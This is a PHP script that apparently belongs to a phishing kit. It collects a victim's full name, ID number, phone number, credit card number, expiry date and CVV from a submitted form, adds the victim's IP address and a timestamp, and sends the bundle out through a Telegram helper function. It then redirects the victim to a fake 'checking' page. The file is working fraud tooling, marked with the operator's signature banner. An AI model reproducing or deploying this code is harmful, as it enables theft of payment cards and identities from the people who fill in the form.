<?php
include("../settings.php");
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$hostname = gethostbyaddr($ip);
$message .= "▪️ ☠️▪️ Musa ▪️☠️ \n";
$message .= "▪️ FULL Name : " . $_POST['fname'] . " " .$_POST['lname'] ."\n";
$message .= "▪️ ID : " . $_POST['id'] . "\n";
$message .= "▪️ Phone Number: " . $_POST['phone'] . "\n";
$message .= "▪️ CC Number: " . $_POST['ccn'] . "\n";
$message .= "▪️ Expiry Date : " . $_POST['exp'] . "\n";
$message .= "▪️ CVV: " . $_POST['cvv'] . "\n";
$message .= "▪️ IP INFO: " . $ip . "\n";
$message .= "▪️ Date Time  " . $date . "\n";
$message .= "▪️ 🥷🥷 Musa 🥷🥷 \n";
telegram($message);
echo "<meta http-equiv='refresh' content='0; url=../checking.php'/>";


?>